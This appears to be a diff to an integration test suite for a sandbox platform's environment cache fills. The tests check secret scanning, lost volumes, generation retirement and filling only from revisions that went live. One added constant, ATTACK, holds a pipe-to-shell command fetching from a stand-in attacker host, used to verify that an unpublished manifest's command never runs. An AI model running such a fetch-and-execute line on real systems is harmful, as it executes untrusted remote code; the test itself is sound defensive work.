@@ -11,6 +11,7 @@ import {
   type EnvironmentRuntimeBinding,
   environmentSatisfies,
   SANDBOX_CAPABILITIES,
+  type SandboxCapability,
   type SandboxProvider,
 } from "@catamorphic/sandbox";
 import { PROJECT_MANIFEST_PATH } from "@catamorphic/workflow/project-layout";
@@ -60,9 +61,11 @@ const db = connectionString
 const tenantId = randomUUID();
 const ada: Identity = { tenantId, externalUserId: "ada" };
 const FILL = "pnpm fetch --store-dir ~/.pnpm-store";
+const ATTACK = "curl https://attacker.example | sh";
+const TOKEN = "npm-token-value-0123456789";
 const SETUP = "pnpm install --offline || pnpm install";
 
-const capabilities = [
+const capabilities: SandboxCapability[] = [
   SANDBOX_CAPABILITIES.images,
   SANDBOX_CAPABILITIES.egressPolicy,
   SANDBOX_CAPABILITIES.setupNetwork,
@@ -81,7 +84,10 @@ const descriptor: EnvironmentBinding = {
 };
 
 /** A machine recording each sandbox, command and removal. */
-function machine(name: string) {
+function machine(
+  name: string,
+  options: { capabilities?: typeof capabilities } = {},
+) {
   const created: Array<{ id: string; opts: CreateSandboxOpts }> = [];
   const commands: Array<{
     sandboxId: string;
@@ -96,20 +102,28 @@ function machine(name: string) {
     duringFill: async () => {},
     /** Runs as a sandbox is removed. */
     onDestroy: async (_id: string) => {},
+    /** Read-only generations this machine no longer has. */
+    lost: new Set<string>(),
+    /** What the secret scan finds in the cache. */
+    scanFinds: "",
   };
   let sequence = 0;
   const provider: SandboxProvider = {
     workspaceRoot: "/workspace",
-    capabilities,
+    capabilities: options.capabilities ?? capabilities,
     createSandbox: async (opts) => {
       sequence += 1;
       const id = `${name}-sandbox-${sequence}`;
       created.push({ id, opts });
+      const skipped = (opts.volumes ?? [])
+        .filter((volume) => volume.readOnly && behavior.lost.has(volume.key))
+        .map((volume) => volume.key);
       return {
         id,
         providerId: id,
         sandboxType: "execution",
         status: "started",
+        ...(skipped.length > 0 ? { skippedVolumes: skipped } : {}),
       };
     },
     destroySandbox: async (id) => {
@@ -131,6 +145,8 @@ function machine(name: string) {
       }
       if (command.includes("du -sk"))
         return { exitCode: 0, result: `${behavior.sizeKib}\n` };
+      if (command.includes("printenv"))
+        return { exitCode: 0, result: behavior.scanFinds };
       return { exitCode: 0, result: "" };
     },
     uploadFiles: async () => {},
@@ -149,7 +165,11 @@ describeIf("Environment caches (ADR 0334)", () => {
   let nodes: WorkerNodesService;
   const machines = new Map<
     string,
-    { lease: { id: string; token: string }; fake: ReturnType<typeof machine> }
+    {
+      lease: { id: string; token: string };
+      fake: ReturnType<typeof machine>;
+      trust: EnvironmentBinding["trust"];
+    }
   >();
   let fills: CacheFillsService;
   let environments: ExecutionEnvironmentsService;
@@ -162,9 +182,11 @@ describeIf("Environment caches (ADR 0334)", () => {
           workloads: ["agent"],
           image: "node:22",
           network: { egress: "allowlist", allow: ["api.example.com"] },
+          secrets: ["NPM_TOKEN"],
           setup: {
             command: SETUP,
             network: { allow: ["registry.npmjs.org"] },
+            secrets: ["NPM_TOKEN"],
           },
           caches: {
             pnpm: {
@@ -178,14 +200,28 @@ describeIf("Environment caches (ADR 0334)", () => {
       defaultEnvironment: "review",
     });
 
-  const addMachine = async (name: string) => {
+  const addMachine = async (
+    name: string,
+    options: {
+      trust?: EnvironmentBinding["trust"];
+      capabilities?: typeof capabilities;
+    } = {},
+  ) => {
     const lease = await nodes.register({
       tenantId,
       authorityId: `caches-${name}`,
-      descriptor: { ...descriptor, id: `${descriptor.id}-${name}` },
+      descriptor: {
+        ...descriptor,
+        id: `${descriptor.id}-${name}`,
+        ...(options.trust ? { trust: options.trust } : {}),
+      },
     });
-    const fake = machine(name);
-    machines.set(lease.id, { lease, fake });
+    const fake = machine(name, options);
+    machines.set(lease.id, {
+      lease,
+      fake,
+      trust: options.trust ?? descriptor.trust,
+    });
     return { lease, fake };
   };
 
@@ -244,6 +280,7 @@ describeIf("Environment caches (ADR 0334)", () => {
           descriptor: {
             ...descriptor,
             id: `${descriptor.id}-${chosen.lease.id}`,
+            trust: chosen.trust,
           },
           workerNodeId: chosen.lease.id,
           workerLeaseToken: chosen.lease.token,
@@ -258,7 +295,16 @@ describeIf("Environment caches (ADR 0334)", () => {
       projectEnvironments,
       executionEnvironments: environments,
       executionAllocations: allocations(),
+      secrets: () => ({
+        resolveForSandbox: async () => ({
+          variables: { NPM_TOKEN: TOKEN, OTHER: "other-secret-value" },
+          delivered: [],
+          missing: [],
+          unmasked: [],
+        }),
+      }),
       retentionDays: 30,
+      claimRenewMs: 50,
     });
   }, 120_000);
 
@@ -273,6 +319,8 @@ describeIf("Environment caches (ADR 0334)", () => {
       fake.behavior.sizeKib = 2048;
       fake.behavior.duringFill = async () => {};
       fake.behavior.onDestroy = async () => {};
+      fake.behavior.lost.clear();
+      fake.behavior.scanFinds = "";
     }
   });
 
@@ -351,7 +399,7 @@ describeIf("Environment caches (ADR 0334)", () => {
     expect(first.opts?.volumes ?? []).toEqual([]);
     expect(
       await cacheNote({ db: db!, allocation: first.allocation }),
-    ).toContain("has no copy yet");
+    ).toContain("this machine has no copy");
     const queued = await fillRows();
     expect(queued).toMatchObject([
       {
@@ -394,7 +442,11 @@ describeIf("Environment caches (ADR 0334)", () => {
     const ran = fake.commands.filter(
       (command) => command.sandboxId === fillSandbox?.id,
     );
-    expect(ran.find((command) => command.command === FILL)?.env).toEqual({});
+    // Only the secrets the setup names, never in a command line.
+    expect(ran.find((command) => command.command === FILL)?.env).toEqual({
+      NPM_TOKEN: TOKEN,
+    });
+    expect(ran.some((command) => command.command.includes(TOKEN))).toBe(false);
     expect(
       ran.some((command) => command.command.includes(".work-cache.json")),
     ).toBe(true);
@@ -666,7 +718,8 @@ describeIf("Environment caches (ADR 0334)", () => {
       idempotencyKey: "ok",
     })) as { fills: Array<{ status: string; commit: string | null }> };
     expect(answer.fills.length).toBeGreaterThan(0);
-    expect(answer.fills.every((fill) => fill.commit === null)).toBe(true);
+    // Pinned to the revision that is live when it is asked for.
+    expect(answer.fills.every((fill) => fill.commit === published)).toBe(true);
   });
 
   it("keeps copies per machine: a new machine fills its own on first use", async () => {
@@ -753,9 +806,369 @@ describeIf("Environment caches (ADR 0334)", () => {
             },
           },
         },
-      }),
+      }).then((mounts) => mounts.volumes),
     ).toEqual([{ key: key(99), path: "~/.pnpm-store" }]);
     expect(PROJECT_PRINCIPAL_ID).toBeTruthy();
     await fills.drain();
+  });
+
+  /** The fill row of one machine, newest first. */
+  const rowsOf = async (node: string) =>
+    (await fillRows()).filter((row) => row.worker_node_id === node).reverse();
+
+  it("releases what an exhausted fill held before failing it, so its machine takes work again", async () => {
+    const { lease } = await addMachine("i");
+    const [row] = await db!
+      .insertInto("environment_cache_fills")
+      .values({
+        tenant_id: tenantId,
+        project_id: projectId,
+        environment_name: "review",
+        cache_name: "pnpm",
+        worker_node_id: lease.id,
+        reason: "requested",
+        status: "running",
+        attempts: 3,
+        generation: "900",
+        claimed_until: sql<Date>`now() - interval '1 minute'`,
+      })
+      .returning("id")
+      .execute();
+    const held = await allocations().create({
+      identity: ada,
+      projectId,
+      environmentName: "review",
+      workloadKind: "agent",
+      rootWorkloadId: row?.id ?? "",
+      workerNodeId: lease.id,
+      policy: {
+        binding: descriptor,
+        requirements: { workload: "agent" },
+      },
+    });
+    await fills.dispatch();
+    expect((await rowsOf(lease.id))[0]?.status).toBe("failed");
+    expect(
+      (
+        await db!
+          .selectFrom("execution_allocations")
+          .select("status")
+          .where("id", "=", held.id)
+          .executeTakeFirstOrThrow()
+      ).status,
+    ).toBe("released");
+  });
+
+  it("forgets a copy its machine lost and fills the machine again, telling the agent", async () => {
+    const { lease, fake } = await addMachine("j");
+    await workspace(lease.id);
+    await fillAll();
+    const [copy] = await rowsOf(lease.id);
+    await db!
+      .updateTable("environment_cache_fills")
+      .set({ last_used_at: sql<Date>`now() - interval '2 days'` })
+      .where("id", "=", copy?.id ?? "")
+      .execute();
+    fake.behavior.lost.add(key(Number(copy?.generation)));
+    const { allocation } = await workspace(lease.id);
+    const rows = await rowsOf(lease.id);
+    const forgotten = rows.find((row) => row.id === copy?.id);
+    expect(forgotten?.status).toBe("evicted");
+    // Not counted as used: nothing mounted it.
+    expect(forgotten?.last_used_at?.getTime()).toBeLessThan(
+      Date.now() - 24 * 3600_000,
+    );
+    expect(
+      rows.filter(
+        (row) => row.status === "queued" && row.reason === "first-use",
+      ),
+    ).toHaveLength(1);
+    expect(await cacheNote({ db: db!, allocation })).toContain(
+      "this machine has no copy",
+    );
+    await fillAll();
+  });
+
+  it("empties a failed generation and retires every generation but the live one and the one being filled", async () => {
+    const { lease, fake } = await addMachine("k");
+    await workspace(lease.id);
+    await fillAll();
+    const live = Number((await rowsOf(lease.id))[0]?.generation);
+    fake.behavior.fillExit = 1;
+    await fills.request({
+      identity: ada,
+      projectId,
+      environment: "review",
+      cache: "pnpm",
+      idempotencyKey: "fails",
+    });
+    fake.commands.length = 0;
+    await fillAll();
+    const failed = (await rowsOf(lease.id))[0];
+    expect(failed?.status).toBe("failed");
+    const failedSandbox = fake.created.at(-1)?.id;
+    expect(
+      fake.commands.some(
+        (command) =>
+          command.sandboxId === failedSandbox &&
+          command.command.includes("-exec rm -rf {} +"),
+      ),
+    ).toBe(true);
+    // A review sandbox mounts the live one and retires the failed one.
+    const review = await workspace(lease.id);
+    expect(review.opts?.volumes).toEqual([
+      {
+        key: key(live),
+        path: "~/.pnpm-store",
+        readOnly: true,
+        retire: [key(Number(failed?.generation))],
+      },
+    ]);
+    // The next fill writes its own and retires the failed one, keeping the
+    // live one that sandboxes still read.
+    fake.behavior.fillExit = 0;
+    await fills.request({
+      identity: ada,
+      projectId,
+      environment: "review",
+      cache: "pnpm",
+      idempotencyKey: "recovers",
+    });
+    await fillAll();
+    const fill = fake.created.find(
+      (entry) =>
+        entry.opts.volumes?.length === 1 &&
+        entry.opts.volumes[0]?.readOnly === undefined &&
+        entry.opts.volumes[0]?.retire !== undefined,
+    );
+    expect(fill?.opts.volumes?.[0]?.retire).toEqual([
+      key(Number(failed?.generation)),
+    ]);
+  });
+
+  it("stops a fill whose Allocation was released, and one whose claim moved, without publishing", async () => {
+    const { lease, fake } = await addMachine("m");
+    await workspace(lease.id);
+    await fillAll();
+    const live = Number((await rowsOf(lease.id))[0]?.generation);
+    // The Allocation is released while the command runs.
+    fake.behavior.duringFill = async () => {
+      await db!
+        .updateTable("execution_allocations")
+        .set({ status: "released", released_at: new Date() })
+        .where("root_workload_id", "=", (await rowsOf(lease.id))[0]?.id ?? "")
+        .execute();
+    };
+    await fills.request({
+      identity: ada,
+      projectId,
+      environment: "review",
+      cache: "pnpm",
+      idempotencyKey: "released",
+    });
+    fake.commands.length = 0;
+    await fillAll();
+    expect((await rowsOf(lease.id))[0]).toMatchObject({
+      status: "failed",
+      error: expect.stringContaining("no longer active"),
+    });
+    expect(fake.commands.some((c) => c.command.includes("du -sk"))).toBe(false);
+    // Another run takes the claim over while this one's command runs.
+    fake.behavior.duringFill = async () => {
+      await db!
+        .updateTable("environment_cache_fills")
+        .set({ generation: "999999" })
+        .where("id", "=", (await rowsOf(lease.id))[0]?.id ?? "")
+        .execute();
+      await new Promise((resolve) => setTimeout(resolve, 300));
+    };
+    await fills.request({
+      identity: ada,
+      projectId,
+      environment: "review",
+      cache: "pnpm",
+      idempotencyKey: "moved",
+    });
+    fake.commands.length = 0;
+    await fillAll();
+    expect(fake.commands.some((c) => c.command.includes("du -sk"))).toBe(false);
+    expect((await rowsOf(lease.id))[0]?.status).toBe("running");
+    expect((await workspace(lease.id)).opts?.volumes?.[0]?.key).toBe(key(live));
+  });
+
+  it("records a fill's sandbox on its Allocation where the machine keeps its own lifecycle", async () => {
+    const { lease } = await addMachine("n", { trust: "local" });
+    await workspace(lease.id);
+    await fillAll();
+    const [row] = await rowsOf(lease.id);
+    expect(row?.status).toBe("succeeded");
+    const allocation = await db!
+      .selectFrom("execution_allocations")
+      .select(["sandbox_provider_id", "status"])
+      .where("root_workload_id", "=", row?.id ?? "")
+      .executeTakeFirstOrThrow();
+    expect(allocation.sandbox_provider_id).toMatch(/^n-sandbox-/);
+  });
+
+  it("refuses a cache on a machine whose provider cannot keep it read only", async () => {
+    const { lease } = await addMachine("o", {
+      capabilities: [SANDBOX_CAPABILITIES.images, SANDBOX_CAPABILITIES.volumes],
+    });
+    await db!
+      .insertInto("environment_cache_fills")
+      .values({
+        tenant_id: tenantId,
+        project_id: projectId,
+        environment_name: "review",
+        cache_name: "pnpm",
+        worker_node_id: lease.id,
+        reason: "requested",
+        status: "succeeded",
+        generation: "5",
+      })
+      .execute();
+    await expect(workspace(lease.id)).rejects.toThrow(
+      "cannot keep a cache read only",
+    );
+  });
+
+  it("counts the wait limit from the last queueing, never time behind a running fill", async () => {
+    const { lease } = await addMachine("p");
+    const insert = (values: { status: string; queued: string }) =>
+      db!
+        .insertInto("environment_cache_fills")
+        .values({
+          tenant_id: tenantId,
+          project_id: projectId,
+          environment_name: "review",
+          cache_name: "pnpm",
+          worker_node_id: lease.id,
+          reason: "requested",
+          status: values.status,
+          ...(values.status === "running"
+            ? {
+                generation: "777",
+                attempts: 1,
+                claimed_until: sql<Date>`now() + interval '10 minutes'`,
+              }
+            : {}),
+          created_at: sql<Date>`now() - interval '3 hours'`,
+          queued_at: sql<Date>`now() - ${sql.raw(`interval '${values.queued}'`)}`,
+        })
+        .returning("id")
+        .executeTakeFirstOrThrow();
+    const running = await insert({ status: "running", queued: "3 hours" });
+    const behind = await insert({ status: "queued", queued: "2 hours" });
+    await fills.dispatch();
+    expect(
+      (await rowsOf(lease.id)).find((row) => row.id === behind.id)?.status,
+    ).toBe("queued");
+    // Asked for again just now: it waits anew once the one ahead ends.
+    await db!
+      .deleteFrom("environment_cache_fills")
+      .where("id", "=", running.id)
+      .execute();
+    await db!
+      .updateTable("environment_cache_fills")
+      .set({ queued_at: sql<Date>`now()` })
+      .where("id", "=", behind.id)
+      .execute();
+    await db!
+      .updateTable("environment_cache_fills")
+      .set({ retry_at: sql<Date>`now() + interval '1 hour'` })
+      .where("id", "=", behind.id)
+      .execute();
+    await fills.dispatch();
+    expect(
+      (await rowsOf(lease.id)).find((row) => row.id === behind.id)?.status,
+    ).toBe("queued");
+    await db!
+      .updateTable("environment_cache_fills")
+      .set({ queued_at: sql<Date>`now() - interval '2 hours'` })
+      .where("id", "=", behind.id)
+      .execute();
+    await fills.dispatch();
+    expect(
+      (await rowsOf(lease.id)).find((row) => row.id === behind.id)?.status,
+    ).toBe("failed");
+  });
+
+  it("refuses to publish a generation that holds a setup secret's value", async () => {
+    const { lease, fake } = await addMachine("q");
+    await workspace(lease.id);
+    fake.behavior.scanFinds = "NPM_TOKEN\n";
+    fake.commands.length = 0;
+    await fillAll();
+    expect((await rowsOf(lease.id))[0]).toMatchObject({
+      status: "failed",
+      error: expect.stringContaining("holds the value of NPM_TOKEN"),
+    });
+    const scan = fake.commands.find((c) => c.command.includes("printenv"));
+    expect(scan?.env).toEqual({ NPM_TOKEN: TOKEN });
+    expect(scan?.command).not.toContain(TOKEN);
+  });
+
+  it("fills only from a revision that went live, with that revision's command and checkout", async () => {
+    const { lease, fake } = await addMachine("r");
+    await workspace(lease.id);
+    await fillAll();
+    // main moves on to a revision whose deploy has not finished, with
+    // another fill command; and one revision's deploy failed.
+    const next = await projectManager.publishFiles({
+      tenantId,
+      projectId,
+      files: { [PROJECT_MANIFEST_PATH]: manifest(ATTACK) },
+      message: "Pending",
+      author: { name: "Test", email: "test@example.com" },
+    });
+    if (next.status !== "deployed") throw new Error("not published");
+    await db!
+      .insertInto("published_revisions")
+      .values([
+        {
+          tenant_id: tenantId,
+          project_id: projectId,
+          commit_sha: next.commitSha,
+          status: "pending",
+        },
+        {
+          tenant_id: tenantId,
+          project_id: projectId,
+          commit_sha: "e".repeat(40),
+          status: "failed",
+        },
+      ])
+      .execute();
+    for (const commit of [next.commitSha, "e".repeat(40)])
+      await expect(
+        fills.request({
+          identity: ada,
+          projectId,
+          environment: "review",
+          cache: "pnpm",
+          commit,
+          idempotencyKey: `not-live-${commit}`,
+        }),
+      ).rejects.toThrow("went live");
+    fake.commands.length = 0;
+    await fills.request({
+      identity: ada,
+      projectId,
+      environment: "review",
+      cache: "pnpm",
+      idempotencyKey: "live",
+    });
+    await fillAll();
+    const [row] = await rowsOf(lease.id);
+    expect(row).toMatchObject({ status: "succeeded", commit_sha: published });
+    expect(fake.commands.some((c) => c.command === FILL)).toBe(true);
+    expect(fake.commands.some((c) => c.command.includes("attacker"))).toBe(
+      false,
+    );
+    expect(
+      fake.commands.some((c) =>
+        c.command.includes(`git checkout -q -f --detach ${published}`),
+      ),
+    ).toBe(true);
   });
 });
